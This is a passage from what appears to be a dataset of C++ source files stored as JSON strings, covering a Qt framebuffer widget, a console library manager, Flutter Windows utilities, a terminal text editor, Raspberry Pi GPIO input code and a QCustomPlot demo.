image->rect());\n        } else {\n            painter->drawImage(0, 0, *image);\n        }\n    } else {\n        QDEBUG << \"Placeholder\";\n        QFont font = painter->font();\n        font.setPointSize(50);\n        font.setBold(true);\n        painter->setFont(font);\n        QRect rect(0, 0, width(), height());\n        painter->fillRect(rect, QColor(255, 255, 0));\n        painter->drawText(rect, \"Unbound Framebuffer \" + QString::number(_framebufferID), Qt::AlignCenter | Qt::AlignTop);\n    }\n    isMidPaint = false;\n}\n\nvoid FBController::associateSHM(QImage *image) {\n    this->image = image;\n    int key = _framebufferID;\n    QMetaObject::invokeMethod(this, [this, key]() {\n        if(!qtfb::management::isControllerAssociated(key)) {\n            // The framebuffer connection was terminated as we were\n            // waiting for the event loop to process this request.\n            this->image = nullptr;\n            this->setActive(false);\n            return;\n        }\n        this->setActive(this->image != nullptr);\n    }, Qt::QueuedConnection);\n}\n\nvoid FBController::markedUpdate(const QRect &rect) {\n    isMidPaint = true;\n    if(_allowScaling && image) {\n        update(QRect(\n           (rect.x() / image->width()) * this->width(),\n           (rect.y() / image->height()) * this->height(),\n           (rect.width() / image->width()) * this->width(),\n           (rect.height() / image->height()) * this->height()\n        ));\n    } else {\n        update(rect);\n    }\n}\n\nvoid FBController::setAllowScaling(bool a){\n    _allowScaling = a;\n}\n\nbool FBController::allowScaling() const {\n    return _allowScaling;\n}\n",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\nusing namespace std; // namespace std \uc0ac\uc6a9\r\n\r\nclass Book {\r\npublic:\r\n    string title;\r\n    string author;\r\n\r\n    Book(const string& title, const string& author)\r\n        : title(title), author(author) {\r\n    }\r\n};\r\n\r\nclass BookManager {\r\nprivate:\r\n    vector<Book> books; // \ucc45 \ubaa9\ub85d \uc800\uc7a5\r\n\r\npublic:\r\n    // \ucc45 \ucd94\uac00 \uba54\uc11c\ub4dc\r\n    void addBook(const string& title, const string& author) {\r\n        books.push_back(Book(title, author)); // push_back \uc0ac\uc6a9\r\n        cout << \"\\n\" << \"\ucc45\uc774 \ucd94\uac00\ub418\uc5c8\uc2b5\ub2c8\ub2e4: \" << title << \" by \" << author << endl;\r\n\t\tcout << \" \" << endl;\r\n    }\r\n\r\n    // \ubaa8\ub4e0 \ucc45 \ucd9c\ub825 \uba54\uc11c\ub4dc\r\n    void displayAllBooks() const {\r\n        if (books.empty()) {\r\n            cout << \"\\n\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\r\n            cout << \" \" << endl;\r\n            return;\r\n        }\r\n\r\n        cout << \"\\n\ud604\uc7ac \ub3c4\uc11c \ubaa9\ub85d:\" << endl;\r\n        for (size_t i = 0; i < books.size(); i++) { // \uc77c\ubc18\uc801\uc778 for\ubb38 \uc0ac\uc6a9\r\n            cout << \"- \" << books[i].title << \" by \" << books[i].author << endl;\r\n        }\r\n        cout << \" \" << endl;\r\n    }\r\n\r\n\t// \ucc45 \uac80\uc0c9 \uba54\uc11c\ub4dc\r\n    void searchBooks(const string& name) {\r\n\t\tbool found = false; // \ucc45\uc744 \ucc3e\uc558\ub294\uc9c0 \uc5ec\ubd80\r\n\t\tint i = 0; // \uc778\ub371\uc2a4 \ubcc0\uc218\r\n\t\tfor (const auto& book : books) { // \ubc94\uc704 \uae30\ubc18 for\ubb38 \uc0ac\uc6a9\r\n\t\t\tif (book.title == name || book.author == name) {\r\n\t\t\t\tcout << \"\ucc3e\uc740 \ucc45: \" << book.title << \" by \" << book.author << endl;\r\n\t\t\t\tfound = true;\r\n                cout << \" \" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (!found) {\r\n\t\t\tcout << \"\\n\ucc3e\ub294 \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\r\n\t\t}\r\n    }\r\n};\r\n\r\nint main() {\r\n    BookManager manager;\r\n\r\n    // \ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\uc758 \uae30\ubcf8 \uba54\ub274\ub97c \ubc18\ubcf5\uc801\uc73c\ub85c \ucd9c\ub825\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4.\r\n    // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\ub97c \uc120\ud0dd\ud558\uae30 \uc804\uae4c\uc9c0 \uacc4\uc18d \ub3d9\uc791\ud569\ub2c8\ub2e4.\r\n    while (true) {\r\n        cout << \"\ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\" << endl;\r\n        cout << \"1. \ucc45 \ucd94\uac00\" << endl; // \ucc45 \uc815\ubcf4\ub97c \uc785\ub825\ubc1b\uc544 \ucc45 \ubaa9\ub85d\uc5d0 \ucd94\uac00\r\n        cout << \"2. \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\r\n\t\tcout << \"3. \uac80\uc0c9\" << endl; // \uac80\uc0c9 \uae30\ub2a5 \ucd94\uac00\r\n        cout << \"4. \uc885\ub8cc\" << endl; // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\r\n        cout << \"\\n\uc120\ud0dd: \";\r\n\r\n        int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\r\n\t\tcin >> choice; // \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \ubc1b\uc74c\r\n\r\n        if (cin.fail()) { // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac, \ubb38\uc790\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uc624\ub958 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud558\uace0 cin \ucd08\uae30\ud654.\r\n            \tcout << \"\\n\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\r\n\t\t\tcin.clear(); // \uc624\ub958 \ud50c\ub798\uadf8 \ucd08\uae30\ud654\r\n\t\t\tcin.ignore(32767, '\\n'); // \uc798\ubabb\ub41c \uc785\ub825 \uc81c\uac70\r\n\t\t\tcontinue; // \ub2e4\uc74c \ubc18\ubcf5\uc73c\ub85c \ub118\uc5b4\uac10    \r\n        }\r\n\r\n        if (choice == 1) {\r\n            // 1\ubc88 \uc120\ud0dd: \ucc45 \ucd94\uac00\r\n            // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \ucc45 \uc81c\ubaa9\uacfc \uc800\uc790\uba85\uc744 \uc785\ub825\ubc1b\uc544 BookManager\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\r\n            string title, author;\r\n            cout << \"\ucc45 \uc81c\ubaa9: \";\r\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\r\n            getline(cin, title); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\r\n            cout << \"\ucc45 \uc800\uc790: \";\r\n            getline(cin, author); // \uc800\uc790\uba85 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\r\n            manager.addBook(title, author); // \uc785\ub825\ubc1b\uc740 \ucc45 \uc815\ubcf4\ub97c \ucd94\uac00\r\n        }\r\n        else if (choice == 2) {\r\n            // 2\ubc88 \uc120\ud0dd: \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\r\n            // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\r\n            manager.displayAllBooks();\r\n        }\r\n        else if (choice == 3) {\r\n            // 3\ubc88 \uc120\ud0dd: \uac80\uc0c9\r\n\t\t\t// \ucc45 \uc81c\ubaa9\uc73c\ub85c \uac80\uc0c9, \uc791\uac00 \uc774\ub984\uc73c\ub85c \uac80\uc0c9\r\n\t\t\tstring name;\r\n\t\t\tcout << \"\uac80\uc0c9\ud560 \ucc45 \uc81c\ubaa9 \ub610\ub294 \uc791\uac00 \uc774\ub984: \";\r\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\r\n\t\t\tgetline(cin, name); // \uac80\uc0c9\ud560 \ucc45 \uc81c\ubaa9 \ub610\ub294 \uc791\uac00 \uc774\ub984 \uc785\ub825(\uacf5\ubc31 \ud3ec\ud568)\r\n            manager.searchBooks(name);\r\n        }\r\n        else if (choice == 4) {\r\n            // 3\ubc88 \uc120\ud0dd: \uc885\ub8cc\r\n            // \ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud558\uace0 \uc0ac\uc6a9\uc790\uc5d0\uac8c \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\r\n            cout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\r\n            break; // while \ub8e8\ud504 \uc885\ub8cc\r\n        }\r\n        else {\r\n            // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\r\n            // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\r\n            cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0; // \ud504\ub85c\uadf8\ub7a8 \uc815\uc0c1 \uc885\ub8cc\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <cstring>\n#include <string>\n#include \"FoodOrder.h\"\n\nusing namespace std;\n\ndouble g_taxrate = 0;\ndouble g_dailydiscount = 0;\n\nnamespace seneca\n{\n\tvoid FoodOrder::read(istream& is)\n\t{\n\t\tif (is)\n\t\t{\n\t\t\tis.getline(m_customerName, 10, ',');\n\n\t\t\tif (m_orderDesc)\n\t\t\t\tdelete[] m_orderDesc;\n\n\t\t\tstring buffer;\n\t\t\tgetline(is, buffer, ',');\n\n\t\t\tm_orderDesc = new char[buffer.length() + 1];\n\t\t\tstrcpy(m_orderDesc, buffer.c_str());\n\n\t\t\tis >> m_price;\n\t\t\tchar tmp{ 'N' };\n\t\t\tis.ignore();\n\t\t\tis >> tmp;\n\t\t\ttmp == 'N' ? m_dailyspecial = false : m_dailyspecial = true;\n\t\t}\n\t}\n\n\tvoid FoodOrder::display() const\n\t{\n\t\tstatic size_t numOrders = 0;\n\t\tcout << left << setw(2) << ++numOrders << \". \";\n\t\tif (m_customerName[0])\n\t\t{\n\t\t\tdouble priceTaxed = m_price + (m_price * g_taxrate);\n\t\t\tcout << setw(10) << m_customerName << \"|\"\n\t\t\t\t << setw(25) << m_orderDesc << \"|\"\n\t\t\t\t << fixed << setw(12) << setprecision(2) << priceTaxed << \"|\";\n\t\t\tif (m_dailyspecial)\n\t\t\t\tcout << right << setprecision(2) << setw(13) << priceTaxed - g_dailydiscount;\n\t\t}\n\t\telse\n\t\t\tcout << \"No Order\";\n\t\tcout << endl;\n\t}\n\n\tFoodOrder::~FoodOrder()\n\t{\n\t\tdelete [] m_orderDesc;\n\t}\n\n\tFoodOrder::FoodOrder(const FoodOrder& src)\n\t{\n\t\t*this = src;\n\t}\n\n\tFoodOrder& FoodOrder::operator=(const FoodOrder& src)\n\t{\n\t\tif (this != &src)\n\t\t{\n\t\t\tdelete [] m_orderDesc;\n\t\t\tm_orderDesc = nullptr;\n\n\t\t\t// Shallow copy\n\t\t\tstrcpy(m_customerName, src.m_customerName);\n\t\t\tm_price = src.m_price;\n\t\t\tm_dailyspecial = src.m_dailyspecial;\n\n\t\t\t// Deep Copy\n\t\t\tif (src.m_orderDesc)\n\t\t\t{\n\t\t\t\tm_orderDesc = new char [strlen(src.m_orderDesc) + 1];\n\t\t\t\tstrcpy(m_orderDesc, src.m_orderDesc);\n\t\t\t}\n\t\t}\n\t\treturn *this;\n\t}\n}\n",
    "/*** includes ***/\n\n#define _DEFAULT_SOURCE\n#define _BSD_SOURCE\n\n#include <cctype>\n#include <cerrno>\n#include <cstdarg>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <sys/ioctl.h>\n#include <termios.h>\n#include <time.h>\n#include <unistd.h>\n#include <vector>\n\n/*** defines ***/\n\n#define KILO_VERSION \"0.0.1\"\n#define KILO_TAB_STOP 8\n#define KILO_QUIT_TIMES 3\n#define FILENAME_DISPLAY_LEN 20\n\n#define CTRL_KEY(k) ((k) & 0x1f)\n\nenum class EditorKey\n{\n  BACKSPACE = 127,\n  ARROW_LEFT = 1000,\n  ARROW_RIGHT,\n  ARROW_UP,\n  ARROW_DOWN,\n  DEL_KEY,\n  HOME_KEY,\n  END_KEY,\n  PAGE_UP,\n  PAGE_DOWN\n};\n\n/*** data ***/\n\nstruct EditorConfig\n{\n  int cx, cy;\n  int rx;\n  int rowoff;\n  int coloff;\n  int screenrows;\n  int screencols;\n  std::vector<std::string> rows;\n  std::vector<std::string> renders;\n  int dirty;\n  std::string filename;\n  std::string statusmsg;\n  time_t statusmsg_time;\n  termios orig_termios;\n} E;\n\n/*** prototypes ***/\nvoid editorSetStatusMessage(const char *fmt, ...);\nvoid editorRefreshScreen();\nstd::string editorPrompt(std::string prompt, void (*callback)(std::string &, int));\n\n/*** terminal ***/\n\nvoid die(const char *s)\n{\n  write(STDOUT_FILENO, \"\\x1b[2J\", 4);\n  write(STDOUT_FILENO, \"\\x1b[H\", 3);\n\n  perror(s);\n  exit(1);\n}\n\nvoid disableRawMode()\n{\n  if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &E.orig_termios) == -1)\n  {\n    die(\"tcsetattr\");\n  }\n}\n\nvoid enableRawMode()\n{\n  if (tcgetattr(STDIN_FILENO, &E.orig_termios) == -1)\n  {\n    die(\"tcgetattr\");\n  }\n\n  atexit(disableRawMode);\n\n  struct termios raw = E.orig_termios;\n  raw.c_iflag &= ~(BRKINT | ICRNL | ISTRIP | IXON);\n  raw.c_oflag &= ~(OPOST);\n  raw.c_cflag |= (CS8);\n  raw.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);\n  raw.c_cc[VMIN] = 0;\n  raw.c_cc[VTIME] = 1;\n\n  if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw) == -1)\n  {\n    die(\"tcsetattr\");\n  }\n}\n\nint editorReadKey()\n{\n  int nread;\n  char c;\n\n  while ((nread = read(STDIN_FILENO, &c, 1)) != 1)\n  {\n    if (nread == -1 && errno != EAGAIN)\n    {\n      die(\"read\");\n    }\n  }\n\n  if (c == '\\x1b')\n  {\n    char seq[3];\n\n    if (read(STDIN_FILENO, &seq[0], 1) != 1)\n    {\n      return '\\x1b';\n    }\n    if (read(STDIN_FILENO, &seq[1], 1) != 1)\n    {\n      return '\\x1b';\n    }\n\n    if (seq[0] == '[')\n    {\n      if (seq[1] >= '0' && seq[1] <= '9')\n      {\n        if (read(STDIN_FILENO, &seq[2], 1) != 1)\n        {\n          return '\\x1b';\n        }\n        if (seq[2] == '~')\n        {\n          switch (seq[1])\n          {\n          case '1':\n            return static_cast<int>(EditorKey::HOME_KEY);\n          case '3':\n            return static_cast<int>(EditorKey::DEL_KEY);\n          case '4':\n            return static_cast<int>(EditorKey::END_KEY);\n          case '5':\n            return static_cast<int>(EditorKey::PAGE_UP);\n          case '6':\n            return static_cast<int>(EditorKey::PAGE_DOWN);\n          case '7':\n            return static_cast<int>(EditorKey::HOME_KEY);\n          case '8':\n            return static_cast<int>(EditorKey::END_KEY);\n          }\n        }\n      }\n      else\n      {\n        switch (seq[1])\n        {\n        case 'A':\n          return static_cast<int>(EditorKey::ARROW_UP);\n        case 'B':\n          return static_cast<int>(EditorKey::ARROW_DOWN);\n        case 'C':\n          return static_cast<int>(EditorKey::ARROW_RIGHT);\n        case 'D':\n          return static_cast<int>(EditorKey::ARROW_LEFT);\n        case 'H':\n          return static_cast<int>(EditorKey::HOME_KEY);\n        case 'F':\n          return static_cast<int>(EditorKey::END_KEY);\n        }\n      }\n    }\n    else if (seq[0] == 'O')\n    {\n      switch (seq[1])\n      {\n      case 'H':\n        return static_cast<int>(EditorKey::HOME_KEY);\n      case 'F':\n        return static_cast<int>(EditorKey::END_KEY);\n      }\n    }\n\n    return '\\x1b';\n  }\n\n  return c;\n}\n\nint getCursorPosition(int *rows, int *cols)\n{\n  char buf[32];\n  unsigned int i = 0;\n\n  if (write(STDOUT_FILENO, \"\\x1b[6n\", 4) != 4)\n  {\n    return -1;\n  }\n\n  while (i < sizeof(buf) - 1)\n  {\n    if (read(STDIN_FILENO, &buf[i], 1) != 1)\n    {\n      break;\n    }\n\n    if (buf[i] == 'R')\n    {\n      break;\n    }\n\n    i++;\n  }\n\n  buf[i] = '\\0';\n\n  if (buf[0] != '\\x1b' || buf[1] != '[')\n  {\n    return -1;\n  }\n\n  if (sscanf(&buf[2], \"%d;%d\", rows, cols) != 2)\n  {\n    return -1;\n  }\n\n  return 0;\n}\n\nint getWindowSize(int *rows, int *cols)\n{\n  struct winsize ws;\n\n  if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == -1 || ws.ws_col == 0)\n  {\n    if (write(STDOUT_FILENO, \"\\x1b[999C\\x1b[999B\", 12) != 12)\n    {\n      return -1;\n    }\n\n    return getCursorPosition(rows, cols);\n  }\n  else\n  {\n    *rows = ws.ws_row;\n    *cols = ws.ws_col;\n    return 0;\n  }\n}\n\n/*** row operations ***/\n\nint editorRowCxToRx(std::string &s, int cx)\n{\n  int rx = 0;\n  for (int i = 0; i < cx; i++)\n  {\n    if (s[i] == '\\t')\n    {\n      rx += (KILO_TAB_STOP - 1) - (rx % KILO_TAB_STOP);\n    }\n    rx++;\n  }\n  return rx;\n}\n\nint editorRowRxToCx",
    "// ----------------------------------------------------------------------------\n//  SleepyPiPlayer:  RaspberryGpioPin   /sys/class/gpio\n//    detect pin-state by /sys/class/gpio\n// https://github.com/raspberrypi/linux/issues/6037\n// 2024-08-04: gpio-numbers += 512   for /sys/class/gpio\n// license: free software   (sleepypiplayer(at)saftfresse.de)  [A.D.2025]\n// - Do whatever you want with the software.\n// - Do not claim my work as your own.\n// - THIS SOFTWARE COMES WITH NO WARRANTIES, USE AT YOUR OWN RISK\n// ----------------------------------------------------------------------------\n#include \"GpioPinRaspberry.h\"\n#include <cstdio>\n#include <cstdlib>\n#include <map>\n#include <string>\n#include <cstring>\n\n\n// ============================================================================\nclass GpioPinRaspberry::PrivateData\n{\npublic:\n   PrivateData()\n   {}\n\n   virtual ~PrivateData()\n   {\n      for (auto it = m_mapGpioValueFile.begin(); it != m_mapGpioValueFile.end(); ++it)\n      {\n         ReleaseSysClassGpio(it->first);\n         ReleaseSysClassGpio(it->first+512);\n      }\n   }\n\n   void ConfigureInput(int nGpioNumber, bool bInitPullUp);\n   bool IsKeyPressed(int nGpioNumber);\n\n\n   void ReleaseSysClassGpio(int nGpioNumber);\n\n   // https://github.com/raspberrypi/linux/issues/6037\n   int SYS_CLASS_GPIO_OFFSET = 0;   // 0 or 512\n\n   bool m_bGpioProblem = false;\n   std::map<int, std::string>   m_mapGpioValueFile;  // e.g. \"/sys/class/gpio/gpio17/value\"\n};\n\n// ----------------------------------------------------------------------------\n\n// avoid problems with /sys/class/gpio ownership\n// unexport e.g. /sys/class/gpio/gpio20/value\nvoid GpioPinRaspberry::PrivateData::ReleaseSysClassGpio(int nGpioNumber)\n{\n   std::FILE* pFile = std::fopen(\"/sys/class/gpio/unexport\", \"w\");\n   if (pFile)\n   {\n      char txtBufferExportNumber[30] = {};\n      sprintf(txtBufferExportNumber, \"%i\", nGpioNumber);\n      fwrite(txtBufferExportNumber, 1, strlen(txtBufferExportNumber), pFile);\n      std::fclose(pFile);\n   }\n}\n\n// ----------------------------------------------------------------------------\n\nvoid GpioPinRaspberry::PrivateData::ConfigureInput(int nGpioNumber, bool bInitPullUp)\n{\n   std::FILE* pFile = fopen(\"/sys/class/gpio/export\", \"w\");\n   if (pFile == nullptr)\n   {\n      m_bGpioProblem = true;\n   }\n   else\n   {\n      char txtBufferExportNumber[30] = {};\n      sprintf(txtBufferExportNumber, \"%i\", nGpioNumber+SYS_CLASS_GPIO_OFFSET);\n      fwrite(txtBufferExportNumber, 1, strlen(txtBufferExportNumber), pFile);\n      fclose(pFile);\n\n      char txtBufferDirectionFile[200] = {};\n      sprintf(txtBufferDirectionFile, \"/sys/class/gpio/gpio%i/direction\", nGpioNumber+SYS_CLASS_GPIO_OFFSET);\n      pFile = fopen(txtBufferDirectionFile, \"w\");\n      if (pFile == nullptr)\n      {\n         m_bGpioProblem = true;\n      }\n      else\n      {\n         fwrite(\"in\", 1, 2, pFile);\n         fclose(pFile);\n         if (bInitPullUp)\n         {\n            char txtBufferPullUp[200] = {};\n            sprintf(txtBufferPullUp, \"pinctrl set %i ip pu\\n\", nGpioNumber);\n            std::system(txtBufferPullUp);\n         }\n\n         char txtBufferValueFile[200] = {};\n         sprintf(txtBufferValueFile,\"/sys/class/gpio/gpio%i/value\", nGpioNumber+SYS_CLASS_GPIO_OFFSET);\n         pFile = fopen(txtBufferValueFile, \"r\");\n         if (pFile == nullptr)\n         {\n            m_bGpioProblem = true;\n         }\n         else\n         {\n            fclose(pFile);\n            m_mapGpioValueFile[nGpioNumber] = std::string(txtBufferValueFile);\n         }\n      }\n   }\n   if (m_bGpioProblem && SYS_CLASS_GPIO_OFFSET == 0)\n   {\n      // https://github.com/raspberrypi/linux/issues/6037\n      // try it again with offset of 512\n      SYS_CLASS_GPIO_OFFSET = 512;\n      m_bGpioProblem = false;\n      ConfigureInput(nGpioNumber, bInitPullUp);\n   }\n}\n\n// ----------------------------------------------------------------------------\n\nbool GpioPinRaspberry::PrivateData::IsKeyPressed(int nGpioNumber)\n{\n   bool bPressed = false;\n\n   if (m_mapGpioValueFile.find(nGpioNumber) != m_mapGpioValueFile.end())\n   {\n      std::FILE* pFile = fopen(m_mapGpioValueFile[nGpioNumber].c_str(), \"r\");\n      if (pFile)\n      {\n         char txtBuffer[10] = {};\n         fread(txtBuffer, 1, 1, pFile);\n         fclose(pFile);\n         bPressed = txtBuffer[0] == '0';\n      }\n   }\n   return bPressed;\n}\n\n\n// ============================================================================\n\nGpioPinRaspberry::GpioPinRaspberry()\n{\n   m_pPriv = std::make_unique<GpioPinRaspberry::PrivateData>();\n\n}\n\n// ----------------------------------------------------------------------------\n\nGpioPinRaspberry::~GpioPinRaspberry()\n{\n}\n\n// ----------------------------------------------------------------------------\n\nbool GpioPinRaspberry::GpioProblemDetected()\n{\n   return m_pPriv->m_bGpioProblem;\n}\n\n// ----------------------------------------------------------------------------\n\nvoid GpioPinRaspberry::ConfigureInput(int nGpioNumber, bool bInitPullUp)\n{",
    "/***************************************************************************\n**                                                                        **\n**  QCustomPlot, an easy to use, modern plotting widget for Qt            **\n**  Copyright (C) 2011-2022 Emanuel Eichhammer                            **\n**                                                                        **\n**  This program is free software: you can redistribute it and/or modify  **\n**  it under the terms of the GNU General Public License as published by  **\n**  the Free Software Foundation, either version 3 of the License, or     **\n**  (at your option) any later version.                                   **\n**                                                                        **\n**  This program is distributed in the hope that it will be useful,       **\n**  but WITHOUT ANY WARRANTY; without even the implied warranty of        **\n**  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         **\n**  GNU General Public License for more details.                          **\n**                                                                        **\n**  You should have received a copy of the GNU General Public License     **\n**  along with this program.  If not, see http://www.gnu.org/licenses/.   **\n**                                                                        **\n****************************************************************************\n**           Author: Emanuel Eichhammer                                   **\n**  Website/Contact: https://www.qcustomplot.com/                         **\n**             Date: 06.11.22                                             **\n**          Version: 2.1.1                                                **\n****************************************************************************/\n\n#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\nMainWindow::MainWindow(QWidget *parent) :\n  QMainWindow(parent),\n  ui(new Ui::MainWindow)\n{\n  ui->setupUi(this);\n  connect(ui->cbUseCurrentSize, SIGNAL(toggled(bool)), ui->sbWidth, SLOT(setDisabled(bool)));\n  connect(ui->cbUseCurrentSize, SIGNAL(toggled(bool)), ui->sbHeight, SLOT(setDisabled(bool)));\n  \n  ui->plot->axisRect()->setMinimumSize(300, 180);\n  setupPlot();\n  \n  // register the plot document object (only needed once, no matter how many plots will be in the QTextDocument):\n  QCPDocumentObject *plotObjectHandler = new QCPDocumentObject(this);\n  ui->textEdit->document()->documentLayout()->registerHandler(QCPDocumentObject::PlotTextFormat, plotObjectHandler);\n}\n\nMainWindow::~MainWindow()\n{\n  delete ui;\n}\n\nvoid MainWindow::setupPlot()\n{\n  // The following plot setup is taken from the sine demo:\n  // add two new graphs and set their look:\n  ui->plot->addGraph();\n  ui->plot->graph(0)->setPen(QPen(Qt::blue)); // line color blue for first graph\n  ui->plot->graph(0)->setBrush(QBrush(QColor(0, 0, 255, 20))); // first graph will be filled with translucent blue\n  ui->plot->addGraph();\n  ui->plot->graph(1)->setPen(QPen(Qt::red)); // line color red for second graph\n  // generate some points of data (y0 for first, y1 for second graph):\n  QVector<double> x(250), y0(250), y1(250);\n  for (int i=0; i<250; ++i)\n  {\n    x[i] = i;\n    y0[i] = qExp(-i/150.0)*qCos(i/10.0); // exponentially decaying cosine\n    y1[i] = qExp(-i/150.0); // exponential envelope\n  }\n  // configure right and top axis to show ticks but no labels:\n  // (see QCPAxisRect::setupFullAxesBox for a quicker method to do this)\n  ui->plot->xAxis2->setVisible(true);\n  ui->plot->xAxis2->setTickLabels(false);\n  ui->plot->yAxis2->setVisible(true);\n  ui->plot->yAxis2->setTickLabels(false);\n  // make left and bottom axes always transfer their ranges to right and top axes:\n  connect(ui->plot->xAxis, SIGNAL(rangeChanged(QCPRange)), ui->plot->xAxis2, SLOT(setRange(QCPRange)));\n  connect(ui->plot->yAxis, SIGNAL(rangeChanged(QCPRange)), ui->plot->yAxis2, SLOT(setRange(QCPRange)));\n  // pass data points to graphs:\n  ui->plot->graph(0)->setData(x, y0);\n  ui->plot->graph(1)->setData(x, y1);\n  // let the ranges scale themselves so graph 0 fits perfectly in the visible area:\n  ui->plot->graph(0)->rescaleAxes();\n  // same thing for graph 1, but only enlarge ranges (in case graph 1 is smaller than graph 0):\n  ui->plot->graph(1)->rescaleAxes(true);\n  // Note: we could have also just called customPlot->rescaleAxes(); instead\n  // Allow user to drag axis ranges with mouse, zoom with mouse wheel and select graphs by clicking:\n  ui->plot->setInteractions(QCP::iRangeDrag | QCP::iRangeZoom | QCP::iSelectPlottables);\n}\n\nvoid MainWindow::on_actionInsert_Plot_triggered()\n{\n  QTextCursor cursor = ui->textEdit->textCursor();\n  \n  // insert the current plot at the cursor position. QCPDocumentObject::generatePlotFormat creates a\n  // vectorized snapshot of the passed plot (with the specified width and height) which gets inserted\n  // into the text document.\n  double width = ui->cbUseCurrentSize->isChecked() ? 0 : ui->sbWid",
